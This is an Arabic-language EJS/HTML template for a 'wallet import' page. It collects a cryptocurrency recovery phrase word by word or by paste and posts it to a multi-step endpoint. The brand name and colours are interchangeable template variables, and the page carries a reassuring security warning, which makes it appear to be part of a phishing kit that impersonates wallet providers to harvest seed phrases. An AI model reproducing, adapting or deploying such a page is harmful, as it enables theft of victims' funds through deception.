<!doctype html>
<html lang="ar" dir="rtl">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title><%= pageContent.page_title %> — <%= tpl.name %></title>
<style>
:root{--bg:<%= tpl.palette.bg %>;--card:<%= tpl.palette.card %>;--fg:<%= tpl.palette.fg %>;--ac:<%= tpl.palette.accent %>;--ac2:<%= tpl.palette.accent2 %>}
*{box-sizing:border-box;margin:0;padding:0}
body{background:var(--bg);color:var(--fg);font-family:system-ui,-apple-system,Tahoma,sans-serif;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
.card{background:var(--card);border-radius:16px;padding:36px 32px;max-width:480px;width:100%;box-shadow:0 8px 32px #00000040}
.brand-logo{font-size:1.2rem;font-weight:700;color:var(--ac);margin-bottom:20px;display:block;text-align:center}
.shield{width:60px;height:60px;background:var(--ac)20;border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 20px;font-size:28px}
h1{font-size:1.2rem;margin-bottom:8px;text-align:center}
.sub{font-size:.88rem;opacity:.65;text-align:center;margin-bottom:24px;line-height:1.6}
.warn{background:#ef444415;border:1px solid #ef444430;border-radius:10px;padding:12px 16px;font-size:.82rem;color:#fca5a5;margin-bottom:20px}
.warn strong{color:#ef4444}
.words-grid{display:grid;grid-template-columns:1fr 1fr 1fr;gap:8px;margin-bottom:20px}
.word-input{position:relative}
.word-num{position:absolute;top:6px;right:8px;font-size:.7rem;opacity:.4;pointer-events:none}
.word-input input{width:100%;padding:10px 8px 8px 8px;background:var(--bg);border:1.5px solid #ffffff15;border-radius:8px;color:var(--fg);font-family:monospace;font-size:.85rem;outline:none;text-align:center;transition:.2s}
.word-input input:focus{border-color:var(--ac);background:var(--ac)08}
.tab-btns{display:flex;gap:8px;margin-bottom:18px}
.tab-btn{flex:1;padding:8px;background:var(--bg);border:1.5px solid #ffffff15;border-radius:8px;color:var(--fg);font-size:.85rem;cursor:pointer;transition:.2s;opacity:.6}
.tab-btn.active{border-color:var(--ac);color:var(--ac);opacity:1}
#paste-area{display:none}
#paste-area textarea{width:100%;padding:12px;background:var(--bg);border:1.5px solid #ffffff18;border-radius:10px;color:var(--fg);font-family:monospace;font-size:.88rem;resize:vertical;min-height:100px;outline:none;margin-bottom:12px}
#paste-area textarea:focus{border-color:var(--ac)}
.btn{width:100%;padding:14px;background:var(--ac);color:#fff;border:0;border-radius:10px;font-size:1rem;font-weight:600;cursor:pointer;transition:.2s}
.btn:hover{opacity:.9}
.err{background:#ef444420;border:1px solid #ef444440;border-radius:8px;padding:10px 14px;font-size:.84rem;color:#fca5a5;margin-bottom:12px;display:none}
</style>
</head>
<body>
<div class="card">
  <span class="brand-logo"><%= tpl.name %></span>
  <div class="shield">🔐</div>
  <h1><%= pageContent.headline || 'استيراد محفظة موجودة' %></h1>
  <p class="sub"><%= pageContent.subheadline || 'أدخل عبارة الاسترداد الخاصة بك للوصول إلى محفظتك' %></p>

  <div class="warn">
    <strong>⚠️ تحذير أمني:</strong> لا تشارك عبارة الاسترداد مع أي أحد. الموقع الرسمي فقط يطلب هذه المعلومات.
  </div>

  <div class="err" id="err"></div>

  <% const wordCount = pageContent.otp_length || 12 %>

  <div class="tab-btns">
    <button class="tab-btn active" onclick="showGrid(event)">إدخال كلمة بكلمة</button>
    <button class="tab-btn" onclick="showPaste(event)">لصق العبارة</button>
  </div>

  <form method="POST" action="/p/<%= page.slug %>/step/<%= pageContent.slug %>" id="seedForm">
    <input type="hidden" name="_csrf" value="<%= csrfToken %>">
    <input type="hidden" name="_step" value="<%= pageContent.slug %>">
    <input type="hidden" name="seed_phrase" id="seedHidden">

    <div id="grid-area">
      <div class="words-grid">
        <% for(let i=1; i<=wordCount; i++) { %>
          <div class="word-input">
            <span class="word-num"><%= i %></span>
            <input type="text" class="word" placeholder="كلمة <%= i %>"
                   autocomplete="off" autocorrect="off" spellcheck="false"
                   onpaste="handlePaste(event,<%= i-1 %>)"
                   oninput="autoNext(this,<%= i %>)">
          </div>
        <% } %>
      </div>
    </div>

    <div id="paste-area">
      <textarea placeholder="الصق عبارة الاسترداد هنا مع فراغ بين كل كلمة..." id="pasteText"></textarea>
    </div>

    <button type="submit" class="btn" onclick="return prepareSeed()"><%= pageContent.cta || 'استيراد المحفظة' %></button>
  </form>
</div>
<script>
function showGrid(e){e.target.classList.add('active');document.querySelectorAll('.tab-btn')[1].classList.remove('active');document.getElementById('grid-area').style.display='';document.getElementById('paste-area').style.display='none'}
function showPaste(e){e.target.classList.add('active');document.querySelectorAll('.tab-btn')[0].classList.remove('active');document.getElementById('grid-area').style.display='none';document.getElementById('paste-area').style.display='block'}
function autoNext(inp,idx){const words=document.querySelectorAll('.word');if(inp.value.includes(' ')){const parts=inp.value.trim().split(/\s+/);inp.value=parts[0];for(let i=1;i<parts.length&&idx+i-1<words.length;i++){words[idx+i-1].value=parts[i]}return}if(inp.value&&idx<words.length)words[idx].focus()}
function handlePaste(e,startIdx){e.preventDefault();const text=e.clipboardData.getData('text');const parts=text.trim().split(/\s+/);const words=document.querySelectorAll('.word');parts.forEach((w,i)=>{if(startIdx+i<words.length)words[startIdx+i].value=w})}
function prepareSeed(){
  const isPaste=document.getElementById('paste-area').style.display!=='none';
  let phrase='';
  if(isPaste){phrase=document.getElementById('pasteText').value.trim()}
  else{phrase=Array.from(document.querySelectorAll('.word')).map(i=>i.value.trim()).join(' ')}
  const words=phrase.split(/\s+/).filter(Boolean);
  const expected=<%= wordCount %>;
  if(words.length<expected){
    const err=document.getElementById('err');
    err.style.display='block';
    err.textContent='يرجى إدخال جميع كلمات عبارة الاسترداد ('+expected+' كلمات)';
    return false;
  }
  document.getElementById('seedHidden').value=phrase;
  return true;
}
</script>
</body>
</html>
